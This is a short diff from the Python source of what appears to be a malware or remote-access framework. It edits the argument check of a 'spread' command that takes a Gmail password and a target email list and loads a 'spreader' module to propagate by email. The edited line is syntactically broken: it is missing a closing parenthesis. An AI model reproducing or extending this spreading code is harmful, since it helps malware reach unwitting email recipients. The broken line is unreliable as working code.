@@ -1161,7 +1161,7 @@ class Payload():
         :param str password:    sender Gmail password
         :param str url:         URL of target email list
         """
-        if not args or len(str(args).split()) != 3:
+        if not args or len(shlex.split(str(args)) != 3:
             return self.spread.usage
         if 'spreader' not in globals():
             self.load('spreader')
